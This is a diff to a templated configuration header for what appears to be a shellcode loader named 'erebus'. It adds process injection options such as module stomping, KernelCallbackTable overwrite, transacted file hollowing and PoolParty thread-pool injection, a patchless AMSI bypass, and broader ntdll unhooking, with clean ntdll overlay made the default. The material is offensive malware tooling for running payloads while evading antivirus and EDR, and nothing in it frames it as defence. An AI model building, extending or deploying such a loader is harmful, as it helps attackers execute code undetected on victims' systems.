@@ -60,9 +60,13 @@
 // Injection technique:
 // 1 = NtMapViewOfSection  - Section mapping injection (Remote)
 // 2 = CreateFiber         - Fiber-based execution (Self)
-// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
-// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
-// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
+// 3 = EarlyCascade        - Early Bird APC via NtQueueApcThread (Remote)
+// 4 = PoolParty           - RemoteTpDirectInsertion, IoCompletion + TP_DIRECT (Remote)
+// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird (Remote)
+// 6 = ModuleStomp         - Module stomping self-injection (Self)
+// 7 = KernelCallbackTable - KCT pointer overwrite (Self)
+// 8 = TxfHollow           - Transacted File Hollowing (Remote)
+// 9 = TpJobObjectApc      - RemoteTpJobDirectInsertion, IoCompletion + TP_JOB (Remote)
 #ifndef CONFIG_INJECTION_TYPE
 #define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}
 #endif
@@ -89,6 +93,8 @@
 #define ExecuteShellcode erebus::InjectionKernelCallback
 #elif CONFIG_INJECTION_TYPE == 8
 #define ExecuteShellcode erebus::InjectionTxfHollow
+#elif CONFIG_INJECTION_TYPE == 9
+#define ExecuteShellcode erebus::InjectionPoolPartyJobApc
 #endif
 
 // ============================================
@@ -196,6 +202,7 @@
 // 1 = Patch AmsiScanBuffer only (default)
 // 2 = Patch AmsiScanBuffer + AmsiOpenSession
 // 3 = All + InvalidateAmsiContext (heap walk)
+// 4 = Patchless (Dr0 HW-BP + VEH, no byte patches)
 #ifndef CONFIG_AMSI_BYPASS_TYPE
 #define CONFIG_AMSI_BYPASS_TYPE {{ AMSI_BYPASS_TYPE | default(1) }}
 #endif
@@ -214,11 +221,12 @@
 // ============================================
 // UNHOOK SCOPE CONFIGURATION
 // ============================================
-// 0 = ntdll only (default)
-// 1 = ntdll + kernel32 + kernelbase
-// 2 = selective (pre-defined sensitive Nt* function list)
+// 0 = None     - skip all NTDLL unhooking
+// 1 = ntdll    - overlay ntdll .text with clean KnownDlls copy (default)
+// 2 = Extended - ntdll + kernel32 + KernelBase
+// 3 = Selective - per-function prologue restore for Nt* injection stubs
 #ifndef CONFIG_UNHOOK_SCOPE
-#define CONFIG_UNHOOK_SCOPE {{ UNHOOK_SCOPE | default(0) }}
+#define CONFIG_UNHOOK_SCOPE {{ UNHOOK_SCOPE | default(1) }}
 #endif
 
 // XOR key for obfuscating patch byte arrays (single byte, 0x01–0xFF)
